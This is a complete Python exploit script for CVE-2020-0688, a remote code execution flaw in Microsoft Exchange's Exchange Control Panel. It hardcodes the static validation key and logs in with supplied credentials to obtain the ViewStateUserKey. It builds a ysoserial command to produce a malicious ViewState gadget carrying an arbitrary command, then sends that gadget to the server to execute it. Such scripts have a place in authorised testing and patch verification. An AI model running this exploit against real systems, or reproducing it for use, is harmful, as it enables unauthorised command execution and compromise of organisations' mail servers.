#!/usr/bin/python
from sys import argv, exit, stdout, stderr, stdin
import argparse
import requests
from bs4 import BeautifulSoup
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from requests_ntlm import HttpNtlmAuth
from urllib import quote, unquote
import logging

# https://www.thezdi.com/blog/2020/2/24/cve-2020-0688-remote-code-execution-on-microsoft-exchange-server-through-fixed-cryptographic-keys


class Exploit:
    validationkey = 'CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF'
    validationalg = 'SHA1'
    generator = 'B97B4E27'
    viewstateuserkey = '05ae4b41-51e1-4c3a-9241-6b87b169d663'
    auth_path = '/owa/auth.owa'
    ecp_path = '/ecp/default.aspx'

    def __init__(
            self,
            redirect=False,
            proxy_address='',
            username='',
            domain='',
            password='',
            target=''
    ):
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        self.username = '%s\\%s' % (domain, username)
        self.target = target
        self.password = password
        self.session = requests.session()
        self.redirect = redirect
        self.timeout = 0.5
        self.proxies = {
            'http': 'http://%s' % proxy_address,
            'https': 'http://%s' % proxy_address
        } \
            if proxy_address is not None \
               and proxy_address != '' else {}
        self.headers = {
            'Connection': 'keep-alive',
            'Pragma': 'no-cache',
            'Cache-Control': 'no-cache',
            'Upgrade-Insecure-Requests': '1',
            'Origin': target,
            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-User': '?1',
            'Sec-Fetch-Dest': 'document',
            'Accept-Language': 'en-US,en;q=0.9',
        }
        self.auth_params = {
            'destination': '',
            'isUtf8': '1',
            'flags': '4',
            'forcedownlevel': '0',
            'username': self.username,
            'password': self.password,
            'passwordText': ''
        }
        self.form_values = {
            '__VIEWSTATEGENERATOR': 'B97B4E27',
            '__VIEWSTATE': ''
        }
        self.cookies = {}

    def do_get(self, url, params=None, data=None):
        return self.session.get(
            url=url,
            verify=False,
            allow_redirects=self.redirect,
            headers=self.headers,
            cookies=self.cookies,
            proxies=self.proxies,
            data=data,
            params=params,
            #auth=HttpNtlmAuth(self.username, self.password)
        )

    def do_post(self, url, data=None, params=None):
        return self.session.post(
            url=url,
            data=data,
            verify=False,
            allow_redirects=self.redirect,
            headers=self.headers,
            cookies=self.cookies,
            proxies=self.proxies,
            params=params,
            #auth=HttpNtlmAuth(self.username, self.password)
        )

    def parse_page(self, content):
        soup = BeautifulSoup(content, 'lxml')
        for key, val in self.form_values.iteritems():
            try:
                for tag in soup.select('input[name=%s]' % key):
                    try:
                        self.form_values[key] = tag['value']
                    except Exception as error:
                        stderr.write('error for key %s error %s\n' % (key, str(error)))
            except Exception as error:
                stderr.write('error for selector %s error %s\n' % (key, str(error)))
        return self

    def debug(self):
        try:
            import http.client as http_client
        except ImportError:
            import httplib as http_client
        http_client.HTTPConnection.debuglevel = 1
        logging.basicConfig()
        logging.getLogger().setLevel(logging.DEBUG)
        requests_log = logging.getLogger("requests.packages.urllib3")
        requests_log.setLevel(logging.DEBUG)
        requests_log.propagate = True
        return self

    def do_auth(self):
        url = '%s%s' % (self.target, self.auth_path)
        resp = self.do_post(url=url, data=self.auth_params)
        return resp

    def get_form(self):
        url = '%s%s' % (self.target, self.ecp_path)
        resp = self.do_get(url=url)
        self.parse_page(content=resp.content)
        return resp

    def send_payload(self, payload):
        url = '%s%s' % (self.target, self.ecp_path)
        self.form_values['__VIEWSTATE'] = quote(payload)
        resp = self.do_get(url=url, params=self.form_values)
        return resp


if __name__ == '__main__':
    parser = argparse.ArgumentParser(add_help=True, description='CVE-2020-0688 Exchange Control Panel (ECP) exploit')
    try:
        parser.add_argument('-target', action='store', help='Target address: http(s)://target.com ')
        parser.add_argument('-username', action='store', default='', help='Username to use: first.last')
        parser.add_argument('-domain', action='store', default='', help='User domain to use: domain.local')
        parser.add_argument('-password', action='store', default='', help='Password to use: Summer2020')
        parser.add_argument('-command', action='store', default='', help='Command to run on the target')
        parser.add_argument('-debug', action='store', default=False, help='Enable debugging: False')
        parser.add_argument('-proxy', action='store', default='', help='Enable proxy: 10.10.10.10:8080')

        if len(argv) == 1:
            parser.print_help()
            exit(1)
        options = parser.parse_args()

        exp = Exploit(
            proxy_address=options.proxy,
            username=options.username,
            domain=options.domain,
            password=options.password,
            target=options.target
        )

        if options.debug:
            exp.debug()
            stdout.write('target %s username %s domain %s password %s debug %s proxy %s\n' % (
                options.target, options.username, options.domain, options.password, options.debug, options.proxy
            ))

        stdout.write('[+] authenticating using %s:%s\n' % (exp.username, exp.password))
        try:
            resp = exp.do_auth()
            exp.viewstateuserkey = exp.session.cookies['ASP.NET_SessionId']
            stdout.write('[+] authenticated, user key %s\n' % exp.viewstateuserkey)
        except Exception as err:
            stderr.write('[-] auth failed\n')
            exit(1)

        stdout.write('[+] retrieving viewstate generator\n')
        try:
            resp = exp.get_form()
            exp.generator = exp.form_values['__VIEWSTATEGENERATOR']
            stdout.write('[+] generator %s, default B97B4E27\n' % exp.generator)
        except Exception as err:
            stderr.write('[-] auth failed\n')
            exit(1)

        ysoserial = [
            'ysoserial.exe',
            '-p', 'ViewState',
            '-g', 'TextFormattingRunProperties',
            '-c', '"%s"' % options.command,
            '--validationalg="%s"' % exp.validationalg,
            '--validationkey="%s"' % exp.validationkey,
            '--generator="%s"' % exp.generator,
            '--viewstateuserkey="%s"' % exp.viewstateuserkey,
            '--isdebug',
            '--islegacy'
        ]
        stdout.write('[+] create gadget using:\n%s\n' % ' '.join(ysoserial))
        stdout.write('[-] paste viewstate (gadget): \n')
        payload = str(stdin.readline()).strip()

        stdout.write('[+] sending payload\n')
        try:
            resp = exp.send_payload(payload)
            stdout.write('[+] payload sent, status %d\n' % resp.status_code)
        except Exception as err:
            stderr.write('[-] auth failed\n')
            exit(1)

    except Exception as error:
        stderr.write('error in main %s' % str(error))
